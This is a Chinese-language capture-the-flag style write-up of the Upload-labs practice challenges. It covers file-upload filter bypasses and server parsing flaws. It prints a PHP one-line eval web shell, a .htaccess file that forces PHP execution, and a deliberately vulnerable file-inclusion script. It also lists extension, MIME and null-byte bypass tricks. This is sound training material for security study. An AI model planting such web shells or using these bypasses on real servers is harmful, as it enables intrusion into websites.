## Upload-libs实验

准备文件：

shell.php

```php
<?php @eval($_POST['hummer']);?>
```

.htaccess

```
<FilesMatch "">
SetHandler application/x-httpd-php
</FilesMatch>
```



### Pass-1

客户端js绕过

①禁用浏览器的js功能

②上传shell.jpg，通过BurpSuit抓包后将文件名修改为shell.php后发送即可

### Pass-2

第二关在上传文件时会检查文件的MIME，在抓包后修改Content-Type为：image/jpg即可

### Pass-3

第三关为黑名单绕过

![](https://s2.loli.net/2022/03/01/k6OrzCVlUxsDe4J.png)

①将shell.php后缀名修改为php3上传即可

②首先上传.htaccess文件，在上传shell.jpg文件。此时服务器会将任意文件中的内容当做php代码执行

### Pass-4

![](https://s2.loli.net/2022/03/01/DpyRGCNauObKAUc.png)

① 可以看到本pass并没有将htaccess后缀名列入黑名单中，因此可以通过Pass-3中的②方法绕过

00截断条件：

- php版本小于5.3.29
- magic_quotes_gpc = Off

②利用0x00截断，首先上传shell.php.jpg，然后抓包

![](https://s2.loli.net/2022/03/01/gMmVZbPE8OWs94J.png)

将文件名最后一个点改为00，将.jpg截断后上传

③

```
利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：
双引号"     =   点号.
大于符号>   =   问号?
小于符号<   =   星号*
```

上传shell.php:.jpg，上传后文件名变为shell.php，但是文件里面的内容为空。我们继续上传文件shell.<,内容为我们的一句话木马，将服务器中的shell.php内容覆盖



### Pass-5

文件名后缀大小写混合绕过。`shell.php`改成`shell.phP`然后上传

### Pass-6

在文件名后面添加一个空格，使黑名单匹配不到，上传到服务器后自动将空格删除

![](https://s2.loli.net/2022/03/01/UbJQ15eNatduORW.png)

### Pass-7

查看源码可知，没有删除文件后面的点，可以在文件后面加一个点绕过黑名单，原理同Pass-6.

![](https://s2.loli.net/2022/03/01/HhzMRgOAkIlBvx4.png)

可以发现在返回的数据包中，返回的文件名后面还是有点的，但是查看服务器对应文件夹中已经上传的文件发现是没有点的。因此可以通过菜刀或蚁剑连接

![](https://s2.loli.net/2022/03/01/ni8DHCJg2VuYfLq.png)

### Pass-8

Windows文件流特性绕过，文件名改成`08.php::$DATA`，上传成功后保存的文件名其实是`08.php`

![](https://s2.loli.net/2022/03/01/pk9KA714SrG5Flm.png)

上传后服务器中文件如图

![](https://s2.loli.net/2022/03/01/Y4JqIDMHb6CQvUy.png)

### Pass-9

查看源码，发现对文件名末尾的点和空格都进行了处理，我们可以通过在文件后添加```点```+```空格```+```点```进行绕过，即```shell.php. .```最后上传到服务器上的仍然是shell.php

### Pass-10

![](https://s2.loli.net/2022/03/01/5RTCQf2x9do1py3.png)

由上图可知，源码中对进制上传的文件名后缀替换为了空，因此我们可以通过双写文件名后缀绕过

![](https://s2.loli.net/2022/03/01/7G6hyqwXvVs1ZT9.png)

### Pass-11

%00截断条件：

- php版本小于5.3.29
- magic_quotes_gpc = Off

本pass上传目录可以控制

先上传shell.jpg，再抓包利用上传目录名将上传的文件名截断

![](https://s2.loli.net/2022/03/01/TvrRPENDgo9fXZ4.png)

### Pass-12

同pass11，请求方式由get变为post，利用0x00截断

![](https://s2.loli.net/2022/03/01/2ITNWV1FfDCv9zA.png)

### Pass-13

制作图片马

```bat
copy shell.jpg /b + shell.php /a muma.jpg
```

![](https://s2.loli.net/2022/03/02/V27AjU6LltYHfIg.png)

上传生成的```muma.jpg```

配合文件包含漏洞进行连接即可

include.php内容如下：用于包含文件muma.jpg

```php
 <?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?> 
```

访问

```http://127.0.0.1/upload/upload/include.php?file=4920220302095833.jpg```

即可成功包含

![](https://s2.loli.net/2022/03/02/Oea1EtwXMs8HSnz.png)

### Pass-14

![](https://s2.loli.net/2022/03/02/Vf6leNsGBjFY38c.png)



利用方法同Pass-13



### 方法总结：

1.绕过JS：

​	①禁用浏览器js

​	②通过Burp抓包修改文件名

2.绕过MIME：

​	①抓包修改Content-Type

3.绕过黑名单

​	①后缀名大小写绕过（PhP,php3,php4)

​	②上传.htaccess文件

​	③采用%00截断或者0x00截断，截断后缀名

​	④在文件后缀名后添加```点```/```空格```/```点+空格+点```

​	⑤shell.php::$DATA

​	⑥文件路径可控时利用%00截断

4.制作图片马配合文件包含漏洞远程连接

## 文件解析漏洞

### IIS解析漏洞

1. 建立\*.asp、\*.asa文件夹时，其目录下的任意文件都将被IIS当做asp文件解析
2. 当文件名为\*.asp;1.jpg时，IIS6.0同样会当做asp脚本执行

针对WebDav扩展服务器的漏洞攻击：IIS Write

<br>

### Apache解析漏洞

在Apache1.x和Apahce2.x中存在解析漏洞：

当碰到不认识的扩展名时，将会从后向前解析，直到碰到溶蚀的扩展名为止，如果都不认识，则会暴露其源码

例如：shell.php.jpg

<br>

### PHP CGI解析漏洞（Nginx解析漏洞）

条件：PHP配置中cgi_fi: x_pathinfo（默认开启）

在开启时访问URL:```http://www.xxx.com/shell.txt/shell.php```

因为shell.php在服务器中并不存在，所以PHP会递归向前解析

## upload检测方法

### 客户端检测

绕过浏览器客户端javascript对文件名后缀的限制

1. F12打开开发工具，删除对文件名产生限制的函数
2. 通过burpsuit抓包，在HTTP层修改文件名

### 服务器检测

1. 黑名单，白名单检测
2. MIME检测
3. 目录验证
